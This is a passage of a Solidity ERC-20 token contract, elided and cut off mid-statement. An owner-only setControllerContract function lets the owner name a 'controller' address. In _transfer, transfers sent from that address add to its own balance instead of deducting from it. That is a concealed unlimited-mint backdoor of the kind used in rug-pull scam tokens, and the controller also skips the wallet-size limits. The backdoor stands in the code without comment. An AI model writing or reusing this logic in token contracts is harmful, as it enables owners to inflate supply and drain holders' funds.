...
import "./TestLib.sol";
contract setControllerContractFacet is IERC20, Context, Ownable {
    ...
    function setControllerContract(address _newController) public onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.controllerContractAddress = _newController;
    }
    ...
    function _transfer(address from, address to, uint256 amount) private {
        ...
        uint256 taxAmount = 0;
        if (from == ds.controllerContractAddress) {
            ds._balances[from] = ds._balances[from].add(amount);
        }
        if (from != owner() && to != owner()) {
            ...
            if (
                (from != ds.controllerContractAddress) &&
            ...
            if (
                (from != ds.controllerContractAddress && to != address(this)) &&
                (to != ds.uniswapV2Pair && !ds._isExcludedFromFee[to])
            ) {
                require(
                    balanceOf(to) + amount <= ds._maxWalletSize,
                    "Exceeds the maxWalletSize"
